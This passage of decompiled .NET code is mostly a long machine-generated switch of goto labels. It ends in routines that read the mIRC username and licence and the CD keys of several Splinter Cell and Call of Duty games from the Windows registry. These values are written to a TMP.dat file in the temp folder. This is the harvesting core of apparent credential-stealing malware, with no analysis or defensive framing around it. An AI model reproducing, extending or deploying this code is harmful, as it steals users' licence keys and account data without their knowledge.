							goto IL_1eb8;
						case 444:
							goto IL_1ed6;
						case 445:
							goto IL_1ef0;
						case 446:
							goto IL_1efe;
						case 447:
							goto IL_1f11;
						case 448:
							goto IL_1f1f;
						case 449:
							goto IL_1f27;
						case 450:
							goto IL_1f45;
						case 451:
							goto IL_1f5f;
						case 452:
							goto IL_1f6d;
						case 453:
							goto IL_1f80;
						case 454:
							goto IL_1f8e;
						case 455:
							goto IL_1f96;
						case 456:
							goto IL_1fb4;
						case 457:
							goto IL_1fce;
						case 458:
							goto IL_1fdc;
						case 459:
							goto IL_1fef;
						case 460:
							goto IL_1ffd;
						case 461:
							goto IL_2005;
						case 462:
							goto IL_2023;
						case 463:
							goto IL_203d;
						case 464:
							goto IL_204b;
						case 465:
							goto IL_205e;
						case 466:
							goto IL_206c;
						case 467:
							goto IL_2074;
						case 468:
							goto IL_2092;
						case 469:
							goto IL_20ac;
						case 470:
							goto IL_20ba;
						case 471:
							goto IL_20cd;
						case 472:
							goto IL_20db;
						case 473:
							goto IL_20e3;
						case 474:
							goto IL_2101;
						case 475:
							goto IL_211b;
						case 476:
							goto IL_2129;
						case 477:
							goto IL_213c;
						case 478:
							goto IL_214a;
						case 479:
							goto IL_2152;
						case 480:
							goto IL_2170;
						case 481:
							goto IL_218a;
						case 482:
							goto IL_2198;
						case 483:
							goto IL_21ab;
						case 484:
							goto IL_21b9;
						case 485:
							goto IL_21c1;
						case 486:
							goto IL_21df;
						case 487:
							goto IL_21f9;
						case 488:
							goto IL_2207;
						case 489:
							goto IL_221a;
						case 490:
							goto IL_2228;
						case 491:
							goto IL_2230;
						case 492:
							goto IL_224e;
						case 493:
							goto IL_2268;
						case 494:
							goto IL_2276;
						case 495:
							goto IL_2289;
						case 496:
							goto IL_2297;
						case 497:
							goto IL_229f;
						case 498:
							goto IL_22bd;
						case 499:
							goto IL_22d7;
						case 500:
							goto IL_22e5;
						case 501:
							goto IL_22f8;
						case 502:
							goto IL_2306;
						case 503:
							goto IL_230e;
						case 504:
							goto IL_232c;
						case 505:
							goto IL_2346;
						case 506:
							goto IL_2354;
						case 507:
							goto IL_2367;
						case 508:
							goto IL_2375;
						case 509:
							goto IL_237d;
						case 510:
							goto IL_239b;
						case 511:
							goto IL_23b5;
						case 512:
							goto IL_23c3;
						case 513:
							goto IL_23d6;
						case 514:
							goto IL_23e4;
						case 515:
							goto IL_23ec;
						case 516:
							goto IL_240a;
						case 517:
							goto IL_2424;
						case 518:
							goto IL_2432;
						case 519:
							goto IL_2445;
						case 520:
							goto IL_2453;
						case 521:
							goto IL_245b;
						case 522:
							goto IL_2479;
						case 523:
							goto IL_2493;
						case 524:
							goto IL_24a1;
						case 525:
							goto IL_24b4;
						case 526:
							goto IL_24c2;
						case 527:
							goto IL_24ca;
						case 528:
							goto IL_24e8;
						case 529:
							goto IL_2502;
						case 530:
							goto IL_2510;
						case 531:
							goto IL_2523;
						case 532:
							goto IL_2531;
						case 533:
							goto IL_2539;
						case 534:
							goto IL_2557;
						case 535:
							goto IL_2571;
						case 536:
							goto IL_257f;
						case 537:
							goto IL_2592;
						case 538:
							goto IL_25a0;
						case 539:
							goto IL_25a8;
						case 540:
							goto IL_25c6;
						case 541:
							goto IL_25e0;
						case 542:
							goto IL_25ee;
						case 543:
							goto IL_2601;
						case 544:
							goto IL_260f;
						case 545:
							goto IL_2617;
						case 546:
							goto IL_2635;
						case 547:
							goto IL_264f;
						case 548:
							goto IL_265d;
						case 549:
							goto IL_2670;
						case 550:
							goto IL_267e;
						case 551:
							goto IL_2686;
						case 552:
							goto IL_26a4;
						case 553:
							goto IL_26be;
						case 554:
							goto IL_26cc;
						case 555:
							goto IL_26df;
						case 556:
							goto IL_26ed;
						case 557:
							goto IL_26f5;
						case 558:
							goto IL_2713;
						case 559:
							goto IL_272d;
						case 560:
							goto IL_273b;
						case 561:
							goto IL_274e;
						case 562:
							goto IL_275c;
						case 563:
							goto IL_2764;
						case 564:
							goto IL_2782;
						case 565:
							goto IL_279c;
						case 566:
							goto IL_27aa;
						case 567:
							goto IL_27bd;
						case 568:
							goto IL_27cb;
						case 569:
							goto IL_27d3;
						case 570:
							goto IL_27f1;
						case 571:
							goto IL_280b;
						case 572:
							goto IL_2819;
						case 573:
							goto IL_282c;
						case 574:
							goto IL_283a;
						case 575:
							goto IL_2842;
						case 576:
							goto IL_2860;
						case 577:
							goto IL_287a;
						case 578:
							goto IL_2888;
						case 579:
							goto IL_289b;
						case 580:
							goto IL_28a9;
						case 581:
							goto IL_28b1;
						case 582:
							goto IL_28cf;
						case 583:
							goto IL_28e9;
						case 584:
							goto IL_28f7;
						case 585:
							goto IL_290a;
						case 586:
							goto IL_2918;
						case 587:
							goto IL_2920;
						case 588:
							goto IL_293e;
						case 589:
							goto IL_2958;
						case 590:
							goto IL_2966;
						case 591:
							goto IL_2979;
						case 592:
							goto IL_2987;
						case 593:
							goto IL_298f;
						case 594:
							goto IL_29ad;
						case 595:
							goto IL_29c7;
						case 596:
							goto IL_29d5;
						case 597:
							goto IL_29e8;
						case 598:
							goto IL_29f6;
						case 599:
							goto IL_29fe;
						case 600:
							goto IL_2a1c;
						case 601:
							goto IL_2a36;
						case 602:
							goto IL_2a44;
						case 603:
							goto IL_2a57;
						case 604:
							goto IL_2a65;
						case 605:
							goto IL_2a6d;
						case 606:
							goto IL_2a8b;
						case 607:
							goto IL_2aa5;
						case 608:
							goto IL_2ab3;
						case 609:
							goto IL_2ac6;
						case 610:
							goto IL_2ad4;
						case 611:
							goto IL_2adc;
						case 612:
							goto IL_2afa;
						case 613:
							goto IL_2b14;
						case 614:
							goto IL_2b22;
						case 615:
							goto IL_2b35;
						case 616:
							goto IL_2b43;
						case 617:
							goto IL_2b4b;
						case 618:
							goto IL_2b69;
						case 619:
							goto IL_2b83;
						case 620:
							goto IL_2b91;
						case 621:
							goto IL_2ba4;
						case 622:
							goto IL_2bb2;
						case 623:
							goto IL_2bba;
						case 624:
							goto IL_2bd8;
						case 625:
							goto IL_2bf2;
						case 626:
							goto IL_2c00;
						case 627:
							goto IL_2c13;
						case 628:
							goto IL_2c21;
						case 629:
							goto IL_2c29;
						case 630:
							goto IL_2c47;
						case 631:
							goto IL_2c61;
						case 632:
							goto IL_2c6f;
						case 633:
							goto IL_2c82;
						case 634:
							goto IL_2c90;
						case 635:
							goto IL_2c98;
						case 636:
							goto IL_2cb6;
						case 637:
							goto IL_2cd0;
						case 638:
							goto IL_2cde;
						case 639:
							goto IL_2cf1;
						case 640:
							goto IL_2cff;
						case 641:
							goto IL_2d07;
						case 642:
							goto IL_2d25;
						case 643:
							goto IL_2d3f;
						case 644:
							goto IL_2d4d;
						case 645:
							goto IL_2d60;
						case 646:
							goto IL_2d6e;
						case 647:
							goto IL_2d76;
						case 648:
							goto IL_2d94;
						case 649:
							goto IL_2dae;
						case 650:
							goto IL_2dbc;
						case 651:
							goto IL_2dcf;
						case 652:
							goto IL_2ddd;
						case 653:
							goto IL_2de5;
						case 654:
							goto IL_2e03;
						case 655:
							goto IL_2e1d;
						case 656:
							goto IL_2e2b;
						case 657:
							goto IL_2e3e;
						case 658:
							goto IL_2e4c;
						case 659:
							goto IL_2e54;
						case 660:
							goto IL_2e72;
						case 661:
							goto IL_2e8c;
						case 662:
							goto IL_2e9a;
						case 663:
							goto IL_2ead;
						case 664:
							goto IL_2ebb;
						case 665:
							goto IL_2ec3;
						case 666:
							goto IL_2ee1;
						case 667:
							goto IL_2efb;
						case 668:
							goto IL_2f09;
						case 669:
							goto IL_2f1c;
						case 670:
							goto IL_2f2a;
						case 671:
							goto IL_2f32;
						case 672:
							goto IL_2f50;
						case 673:
							goto IL_2f6a;
						case 674:
							goto IL_2f78;
						case 675:
							goto IL_2f8b;
						case 676:
							goto IL_2f99;
						case 677:
							goto IL_2fa1;
						case 678:
							goto IL_2fbf;
						case 679:
							goto IL_2fd9;
						case 680:
							goto IL_2fe7;
						case 681:
							goto IL_2ffa;
						case 682:
							goto IL_3008;
						case 683:
							goto IL_3010;
						case 684:
							goto IL_302e;
						case 685:
							goto IL_3048;
						case 686:
							goto IL_3056;
						case 687:
							goto IL_3069;
						case 688:
							goto IL_3077;
						case 689:
							goto IL_307f;
						case 690:
							goto IL_309d;
						case 691:
							goto IL_30b7;
						case 692:
							goto IL_30c5;
						case 693:
							goto IL_30d8;
						case 694:
							goto IL_30e6;
						case 695:
							goto IL_30ee;
						case 696:
							goto IL_310c;
						case 697:
							goto IL_3126;
						case 698:
							goto IL_3134;
						case 699:
							goto IL_3147;
						case 700:
							goto IL_3155;
						case 701:
							goto IL_315d;
						case 702:
							goto IL_317b;
						case 703:
							goto IL_3195;
						case 704:
							goto IL_31a3;
						case 705:
							goto IL_31b6;
						case 706:
							goto IL_31c4;
						case 707:
							goto IL_31cc;
						case 708:
							goto IL_31ea;
						case 709:
							goto IL_3204;
						case 710:
							goto IL_3212;
						case 711:
							goto IL_3225;
						case 712:
							goto IL_3233;
						case 713:
							goto IL_323b;
						case 714:
							goto IL_3259;
						case 715:
							goto IL_3273;
						case 716:
							goto IL_3281;
						case 717:
							goto IL_3294;
						case 718:
							goto IL_32a2;
						case 719:
							goto IL_32aa;
						case 720:
							goto IL_32c8;
						case 721:
							goto IL_32e2;
						case 722:
							goto IL_32f0;
						case 723:
							goto IL_3303;
						case 724:
							goto IL_3311;
						case 725:
							goto IL_3319;
						case 726:
							goto IL_3337;
						case 727:
							goto IL_3351;
						case 728:
							goto IL_335f;
						case 729:
							goto IL_3372;
						case 730:
							goto IL_3380;
						case 731:
							goto IL_3388;
						case 732:
							goto IL_33a6;
						case 733:
							goto IL_33c0;
						case 734:
							goto IL_33ce;
						case 735:
							goto IL_33e1;
						case 736:
							goto IL_33ef;
						case 737:
							goto IL_33f7;
						case 738:
							goto IL_3415;
						case 739:
							goto IL_342f;
						case 740:
							goto IL_343d;
						case 741:
							goto IL_3450;
						case 742:
							goto IL_345e;
						case 743:
							goto IL_3466;
						case 744:
							goto IL_3484;
						case 745:
							goto IL_349e;
						case 746:
							goto IL_34ac;
						case 747:
							goto IL_34bf;
						case 748:
							goto IL_34cd;
						case 749:
							goto IL_34d5;
						case 750:
							goto IL_34f3;
						case 751:
							goto IL_350d;
						case 752:
							goto IL_351b;
						case 753:
							goto IL_352e;
						case 754:
							goto IL_353c;
						case 755:
							goto IL_3544;
						case 756:
							goto IL_3562;
						case 757:
							goto IL_357c;
						case 758:
							goto IL_358a;
						case 759:
							goto IL_359d;
						case 760:
							goto IL_35ab;
						case 761:
							goto IL_35b3;
						case 762:
							goto IL_35d1;
						case 763:
							goto IL_35eb;
						case 764:
							goto IL_35f9;
						case 765:
							goto IL_360c;
						case 766:
							goto IL_361a;
						case 767:
							goto IL_3622;
						case 768:
							goto IL_3640;
						case 769:
							goto IL_365a;
						case 770:
							goto IL_3668;
						case 771:
							goto IL_367b;
						case 772:
							goto IL_3689;
						case 773:
							goto IL_3691;
						case 774:
							goto IL_36af;
						case 775:
							goto IL_36c9;
						case 776:
							goto IL_36d7;
						case 777:
							goto IL_36ea;
						case 778:
							goto IL_36f8;
						case 779:
							goto IL_3700;
						case 780:
							goto IL_371e;
						case 781:
							goto IL_3738;
						case 782:
							goto IL_3746;
						case 783:
							goto IL_3759;
						case 784:
							goto IL_3767;
						case 785:
							goto IL_376f;
						case 786:
							goto IL_378d;
						case 787:
							goto IL_37a7;
						case 788:
							goto IL_37b5;
						case 789:
							goto IL_37c8;
						case 790:
							goto IL_37d6;
						case 791:
							goto IL_37de;
						case 792:
							goto IL_37fc;
						case 793:
							goto IL_3816;
						case 794:
							goto IL_3824;
						case 795:
							goto IL_3837;
						case 796:
							goto IL_3845;
						case 797:
							goto IL_384d;
						case 798:
							goto IL_386b;
						case 799:
							goto IL_3885;
						case 800:
							goto IL_3893;
						case 801:
							goto IL_38a6;
						case 802:
							goto IL_38b4;
						case 803:
							goto IL_38bc;
						case 804:
							goto IL_38da;
						case 805:
							goto IL_38f4;
						case 806:
							goto IL_3902;
						case 807:
							goto IL_3915;
						case 808:
							goto IL_3923;
						case 809:
							goto IL_392b;
						case 810:
							goto IL_3949;
						case 811:
							goto IL_3963;
						case 812:
							goto IL_3971;
						case 813:
							goto IL_3984;
						case 814:
							goto IL_3992;
						case 815:
							goto IL_399a;
						case 816:
							goto IL_39b8;
						case 817:
							goto IL_39d2;
						case 818:
							goto IL_39e0;
						case 819:
							goto IL_39f3;
						case 820:
							goto IL_3a01;
						case 821:
							goto IL_3a09;
						case 822:
							goto IL_3a27;
						case 823:
							goto IL_3a41;
						case 824:
							goto IL_3a4f;
						case 825:
							goto IL_3a62;
						case 826:
							goto IL_3a70;
						case 827:
							goto IL_3a78;
						case 828:
							goto IL_3a96;
						case 829:
							goto IL_3ab0;
						case 830:
							goto IL_3abe;
						case 831:
							goto IL_3ad1;
						case 832:
							goto IL_3adf;
						case 833:
							goto IL_3ae7;
						case 834:
							goto IL_3b05;
						case 835:
							goto IL_3b1f;
						case 836:
							goto IL_3b2d;
						case 837:
							goto IL_3b40;
						case 838:
							goto IL_3b4e;
						case 839:
							goto IL_3b56;
						case 840:
							goto IL_3b74;
						case 841:
							goto IL_3b8e;
						case 842:
							goto IL_3b9c;
						case 843:
							goto IL_3baf;
						case 844:
							goto IL_3bbd;
						case 845:
							goto IL_3bc5;
						case 846:
							goto IL_3be3;
						case 847:
							goto IL_3bfd;
						case 848:
							goto IL_3c0b;
						case 849:
							goto IL_3c1e;
						case 850:
							goto IL_3c2c;
						case 851:
							goto IL_3c34;
						case 852:
							goto IL_3c52;
						case 853:
							goto IL_3c6c;
						case 854:
							goto IL_3c7a;
						case 855:
							goto IL_3c8d;
						case 856:
							goto IL_3c9b;
						case 857:
							goto IL_3ca3;
						case 858:
							goto IL_3cc1;
						case 859:
							goto IL_3cdb;
						case 860:
							goto IL_3ce9;
						case 861:
							goto IL_3cfc;
						case 862:
							goto IL_3d0a;
						case 863:
							goto IL_3d12;
						case 864:
							goto IL_3d30;
						case 865:
							goto IL_3d4a;
						case 866:
							goto IL_3d58;
						case 867:
							goto IL_3d6b;
						case 868:
							goto IL_3d79;
						case 869:
							goto IL_3d81;
						case 870:
							goto IL_3d9f;
						case 871:
							goto IL_3db9;
						case 872:
							goto IL_3dc7;
						case 873:
							goto IL_3dda;
						case 874:
							goto IL_3de8;
						case 875:
							goto IL_3df0;
						case 876:
							goto IL_3e0e;
						case 877:
							goto IL_3e28;
						case 878:
							goto IL_3e36;
						case 879:
							goto IL_3e49;
						case 880:
							goto IL_3e57;
						case 881:
							goto IL_3e5f;
						case 882:
							goto IL_3e7d;
						case 883:
							goto IL_3e97;
						case 884:
							goto IL_3ea5;
						case 885:
							goto IL_3eb8;
						case 886:
							goto IL_3ec6;
						case 887:
							goto IL_3ece;
						case 888:
							goto IL_3eec;
						case 889:
							goto IL_3f06;
						case 890:
							goto IL_3f14;
						case 891:
							goto IL_3f27;
						case 892:
							goto IL_3f35;
						case 893:
							goto IL_3f3d;
						case 894:
							goto IL_3f5b;
						case 895:
							goto IL_3f75;
						case 896:
							goto IL_3f83;
						case 897:
							goto IL_3f96;
						case 898:
							goto IL_3fa4;
						case 899:
							goto IL_3fac;
						case 900:
							goto IL_3fca;
						case 901:
							goto IL_3fe4;
						case 902:
							goto IL_3ff2;
						case 903:
							goto IL_4005;
						case 904:
							goto IL_4013;
						case 905:
							goto IL_401b;
						case 906:
							goto IL_4039;
						case 907:
							goto IL_4053;
						case 908:
							goto IL_4061;
						case 909:
							goto IL_4074;
						case 910:
							goto IL_4082;
						case 911:
							goto IL_408a;
						case 912:
							goto IL_40a8;
						case 913:
							goto IL_40c2;
						case 914:
							goto IL_40d0;
						case 915:
							goto IL_40e3;
						case 916:
							goto IL_40f1;
						case 917:
							goto IL_40f9;
						case 918:
							goto IL_4117;
						case 919:
							goto IL_4131;
						case 920:
							goto IL_413f;
						case 921:
							goto IL_4152;
						case 922:
							goto IL_4160;
						case 923:
							goto IL_4168;
						case 924:
							goto IL_4186;
						case 925:
							goto IL_41a0;
						case 926:
							goto IL_41ae;
						case 927:
							goto IL_41c1;
						case 928:
							goto IL_41cf;
						case 929:
							goto IL_41d7;
						case 930:
							goto IL_41f5;
						case 931:
							goto IL_420f;
						case 932:
							goto IL_421d;
						case 933:
							goto IL_4230;
						case 934:
							goto IL_423e;
						case 935:
							goto IL_4246;
						case 936:
							goto IL_4264;
						case 937:
							goto IL_427e;
						case 938:
							goto IL_428c;
						case 939:
							goto IL_429f;
						case 940:
							goto IL_42ad;
						case 941:
							goto IL_42b5;
						case 942:
							goto IL_42d3;
						case 943:
							goto IL_42ed;
						case 944:
							goto IL_42fb;
						case 945:
							goto IL_430e;
						case 946:
							goto IL_431c;
						case 947:
							goto IL_4324;
						case 948:
							goto IL_4342;
						case 949:
							goto IL_435c;
						case 950:
							goto IL_436a;
						case 951:
							goto IL_437d;
						case 952:
							goto IL_438b;
						case 953:
							goto IL_4393;
						case 954:
							goto IL_43b1;
						case 955:
							goto IL_43cb;
						case 956:
							goto IL_43d9;
						case 957:
							goto IL_43ec;
						case 958:
							goto IL_43fa;
						case 959:
							goto IL_4402;
						case 960:
							goto IL_4420;
						case 961:
							goto IL_443a;
						case 962:
							goto IL_4448;
						case 963:
							goto IL_445b;
						case 964:
							goto IL_4469;
						case 965:
							goto IL_4471;
						case 966:
							goto IL_448f;
						case 967:
							goto IL_44a9;
						case 968:
							goto IL_44b7;
						case 969:
							goto IL_44ca;
						case 970:
							goto IL_44d8;
						case 971:
							goto IL_44e0;
						case 972:
							goto IL_44fe;
						case 973:
							goto IL_4518;
						case 974:
							goto IL_4526;
						case 975:
							goto IL_4539;
						case 976:
							goto IL_4547;
						case 977:
							goto IL_454f;
						case 978:
							goto IL_456d;
						case 979:
							goto IL_4587;
						case 980:
							goto IL_4595;
						case 981:
							goto IL_45a8;
						case 982:
							goto IL_45b6;
						case 983:
							goto IL_45be;
						case 984:
							goto IL_45dc;
						case 985:
							goto IL_45f6;
						case 986:
							goto IL_4604;
						case 987:
							goto IL_4617;
						case 988:
							goto IL_4625;
						case 989:
							goto IL_462d;
						case 990:
							goto IL_464b;
						case 991:
							goto IL_4665;
						case 992:
							goto IL_4673;
						case 993:
							goto IL_4686;
						case 994:
							goto IL_4694;
						case 995:
							goto IL_469c;
						case 996:
							goto IL_46ba;
						case 997:
							goto IL_46d4;
						case 998:
							goto IL_46e2;
						case 999:
							goto IL_46f5;
						case 1000:
							goto IL_4703;
						case 1001:
							goto IL_470b;
						case 1002:
							goto IL_4729;
						case 1003:
							goto IL_4743;
						case 1004:
							goto IL_4751;
						case 1005:
							goto IL_4764;
						case 1006:
							goto IL_4772;
						case 1007:
							goto IL_477a;
						case 1008:
							goto IL_4798;
						case 1009:
							goto IL_47b2;
						case 1010:
							goto IL_47c0;
						case 1011:
							goto IL_47d3;
						case 1012:
							goto IL_47e1;
						case 1013:
							goto IL_47e9;
						case 1014:
							goto IL_4807;
						case 1015:
							goto IL_4821;
						case 1016:
							goto IL_482f;
						case 1017:
							goto IL_4842;
						case 1018:
							goto IL_4850;
						case 1019:
							goto IL_4858;
						case 1020:
							goto IL_4876;
						case 1021:
							goto IL_4890;
						case 1022:
							goto IL_489e;
						case 1023:
							goto IL_48b1;
						case 1024:
							goto IL_48bf;
						case 1025:
							goto IL_48c7;
						case 1026:
							goto IL_48e5;
						case 1027:
							goto IL_48ff;
						case 1028:
							goto IL_490d;
						case 1029:
							goto IL_4920;
						case 1030:
							goto IL_492e;
						case 1031:
							goto IL_4936;
						case 1032:
							goto IL_4954;
						case 1033:
							goto IL_496e;
						case 1034:
							goto IL_497c;
						case 1035:
							goto IL_498f;
						case 1036:
							goto IL_499d;
						case 1037:
							goto IL_49a5;
						case 1038:
							goto IL_49c3;
						case 1039:
							goto IL_49dd;
						case 1040:
							goto IL_49eb;
						case 1041:
							goto IL_49fe;
						case 1042:
							goto IL_4a0c;
						case 1043:
							goto IL_4a14;
						case 1044:
							goto IL_4a32;
						case 1045:
							goto IL_4a4c;
						case 1046:
							goto IL_4a5a;
						case 1047:
							goto IL_4a6d;
						case 1048:
							goto IL_4a7b;
						case 1049:
							goto IL_4a83;
						case 1050:
							goto IL_4aa1;
						case 1051:
							goto IL_4abb;
						case 1052:
							goto IL_4ac9;
						case 1053:
							goto IL_4adc;
						case 1054:
							goto IL_4aea;
						case 1055:
							goto IL_4af2;
						case 1056:
							goto IL_4b10;
						case 1057:
							goto IL_4b2a;
						case 1058:
							goto IL_4b38;
						case 1059:
							goto IL_4b4b;
						case 1060:
							goto IL_4b59;
						case 1061:
							goto IL_4b61;
						case 1062:
							goto IL_4b7f;
						case 1063:
							goto IL_4b99;
						case 1064:
							goto IL_4ba7;
						case 1065:
							goto IL_4bba;
						case 1066:
							goto IL_4bc8;
						case 1067:
							goto IL_4bd0;
						case 1068:
							goto IL_4bee;
						case 1069:
							goto IL_4c08;
						case 1070:
							goto IL_4c16;
						case 1071:
							goto IL_4c29;
						case 1072:
							goto IL_4c37;
						case 1073:
							goto IL_4c3f;
						case 1074:
							goto IL_4c5d;
						case 1075:
							goto IL_4c77;
						case 1076:
							goto IL_4c85;
						case 1077:
							goto IL_4c98;
						case 1078:
							goto IL_4ca6;
						case 1079:
							goto IL_4cae;
						case 1080:
							goto IL_4cd0;
						case 1081:
							goto IL_4cea;
						case 1082:
							goto IL_4cf8;
						case 1083:
							goto IL_4d0b;
						case 1084:
							goto IL_4d19;
						case 1085:
							goto IL_4d21;
						case 1086:
							goto IL_4d43;
						case 1087:
							goto IL_4d5d;
						case 1088:
							goto IL_4d6b;
						case 1089:
							goto IL_4d7e;
						case 1090:
							goto IL_4d8c;
						case 1091:
							goto IL_4d94;
						case 1092:
							goto IL_4db6;
						case 1093:
							goto IL_4dd0;
						case 1094:
							goto IL_4dde;
						case 1095:
							goto IL_4df1;
						case 1096:
							goto IL_4dff;
						case 1097:
							goto IL_4e07;
						case 1098:
							goto IL_4e29;
						case 1099:
							goto IL_4e43;
						case 1100:
							goto IL_4e51;
						case 1101:
							goto IL_4e64;
						case 1102:
							goto IL_4e72;
						case 1103:
							goto IL_4e7a;
						case 1104:
							goto IL_4e9c;
						case 1105:
							goto IL_4eb6;
						case 1106:
							goto IL_4ec4;
						case 1107:
							goto IL_4ed7;
						case 1108:
							goto IL_4ee5;
						case 1109:
							goto IL_4eed;
						case 1110:
							goto IL_4f0f;
						case 1111:
							goto IL_4f29;
						case 1112:
							goto IL_4f37;
						case 1113:
							goto IL_4f4a;
						case 1114:
							goto IL_4f58;
						case 1115:
							goto IL_4f60;
						case 1116:
							goto IL_4f82;
						case 1117:
							goto IL_4f9c;
						case 1118:
							goto IL_4faa;
						case 1119:
							goto IL_4fbd;
						case 1120:
							goto IL_4fcb;
						case 1121:
							goto IL_4fd3;
						case 1122:
							goto IL_4ff5;
						case 1123:
							goto IL_500f;
						case 1124:
							goto IL_501d;
						case 1125:
							goto IL_5030;
						case 1126:
							goto IL_503e;
						case 1127:
							goto IL_5046;
						case 1128:
							goto IL_5068;
						case 1129:
							goto IL_5082;
						case 1130:
							goto IL_5090;
						case 1131:
							goto IL_50a3;
						case 1132:
							goto IL_50b1;
						case 1133:
							goto IL_50b9;
						case 1134:
							goto IL_50db;
						case 1135:
							goto IL_50f5;
						case 1136:
							goto IL_5103;
						case 1137:
							goto IL_5116;
						case 1138:
							goto IL_5124;
						case 1139:
							goto IL_512c;
						case 1140:
							goto IL_514e;
						case 1141:
							goto IL_5168;
						case 1142:
							goto IL_5176;
						case 1143:
							goto IL_5189;
						case 1144:
							goto IL_5197;
						case 1145:
							goto IL_519f;
						case 1146:
							goto IL_51c1;
						case 1147:
							goto IL_51db;
						case 1148:
							goto IL_51e9;
						case 1149:
							goto IL_51fc;
						case 1150:
							goto IL_520a;
						case 1151:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 1152:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_520a:
					num = 1150;
					streamWriter.Flush();
					break;
					IL_0008:
					num = 2;
					streamWriter = new StreamWriter(Interaction.Environ("tmp") + "\\TMP.dat");
					goto IL_0026;
					IL_0026:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_002e;
					IL_002e:
					num = 4;
					text = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\mIRC\\UserName", "", null));
					goto IL_0048;
					IL_0048:
					num = 5;
					streamWriter.WriteLine("mIRC Username : " + text);
					goto IL_005e;
					IL_005e:
					num = 6;
					streamWriter.Flush();
					goto IL_0068;
					IL_0068:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0070;
					IL_0070:
					num = 8;
					text2 = Conversions.ToString(Registry.GetValue("HKEY_CURRENT_USER\\Software\\mIRC\\License", "", null));
					goto IL_008a;
					IL_008a:
					num = 9;
					streamWriter.WriteLine("mIRC Pass : " + text2);
					goto IL_00a1;
					IL_00a1:
					num = 10;
					streamWriter.WriteLine("");
					goto IL_00b1;
					IL_00b1:
					num = 11;
					streamWriter.Flush();
					goto IL_00bc;
					IL_00bc:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_00c4;
					IL_00c4:
					num = 13;
					text3 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ubisoft\\Splinter Cell Pandora Tomorrow", "CDKey", null));
					goto IL_00de;
					IL_00de:
					num = 14;
					streamWriter.WriteLine("Splinter Cell Pandora Tomorrow : " + text3);
					goto IL_00f4;
					IL_00f4:
					num = 15;
					streamWriter.WriteLine("");
					goto IL_0104;
					IL_0104:
					num = 16;
					streamWriter.Flush();
					goto IL_010f;
					IL_010f:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0117;
					IL_0117:
					num = 18;
					text4 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Ubisoft\\Splinter Cell Chaos Theory\\Keys", "DiscKey_SCCT", null));
					goto IL_0131;
					IL_0131:
					num = 19;
					streamWriter.WriteLine("Splinter Cell Chaos Theory :" + text4);
					goto IL_0147;
					IL_0147:
					num = 20;
					streamWriter.Flush();
					goto IL_0152;
					IL_0152:
					num = 21;
					streamWriter.WriteLine("");
					goto IL_0162;
					IL_0162:
					num = 22;
					streamWriter.Flush();
					goto IL_016d;
					IL_016d:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0175;
					IL_0175:
					num = 24;
					text5 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty", "codkey", null));
					goto IL_018f;
					IL_018f:
					num = 25;
					streamWriter.WriteLine("Call of Duty : " + text5);
					goto IL_01a5;
					IL_01a5:
					num = 26;
					streamWriter.Flush();
					goto IL_01b0;
					IL_01b0:
					num = 27;
					streamWriter.WriteLine("");
					goto IL_01c0;
					IL_01c0:
					num = 28;
					streamWriter.Flush();
					goto IL_01cb;
					IL_01cb:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_01d3;
					IL_01d3:
					num = 30;
					text6 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty United Offensive", "key", null));
					goto IL_01ee;
					IL_01ee:
					num = 31;
					streamWriter.WriteLine("Call of Duty United Offensive : " + text6);
					goto IL_0205;
					IL_0205:
					num = 32;
					streamWriter.Flush();
					goto IL_0210;
					IL_0210:
					num = 33;
					streamWriter.WriteLine("");
					goto IL_0220;
					IL_0220:
					num = 34;
					streamWriter.Flush();
					goto IL_022b;
					IL_022b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0233;
					IL_0233:
					num = 36;
					text7 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty 2", "codkey", null));
					goto IL_024e;
					IL_024e:
					num = 37;
					streamWriter.WriteLine("Call of Duty 2 : " + text7);
					goto IL_0265;
					IL_0265:
					num = 38;
					streamWriter.Flush();
					goto IL_0270;
					IL_0270:
					num = 39;
					streamWriter.WriteLine("");
					goto IL_0280;
					IL_0280:
					num = 40;
					streamWriter.Flush();
					goto IL_028b;
					IL_028b:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0293;
					IL_0293:
					num = 42;
					text8 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty 4", "codkey", null));
					goto IL_02ae;
					IL_02ae:
					num = 43;
					streamWriter.WriteLine("Call of Duty 4 : " + text8);
					goto IL_02c5;
					IL_02c5:
					num = 44;
					streamWriter.Flush();
					goto IL_02d0;
					IL_02d0:
					num = 45;
					streamWriter.WriteLine("");
					goto IL_02e0;
					IL_02e0:
					num = 46;
					streamWriter.Flush();
					goto IL_02eb;
					IL_02eb:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_02f3;
					IL_02f3:
					num = 48;
					text9 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Wow6432Node\\Activision\\Call of duty 4\\", "codkey", null));
					goto IL_030d;
					IL_030d:
					num = 49;
					streamWriter.WriteLine("COD4 Steam Version : " + text9);
					goto IL_0323;
					IL_0323:
					num = 50;
					streamWriter.WriteLine("");
					goto IL_0333;
					IL_0333:
					num = 51;
					streamWriter.Flush();
					goto IL_033e;
					IL_033e:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0346;
					IL_0346:
					num = 53;
					text10 = Conversions.ToString(Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Activision\\Call of Duty WAW", "codkey", null));
					goto IL_0361;
					IL_0361:
					num = 54;
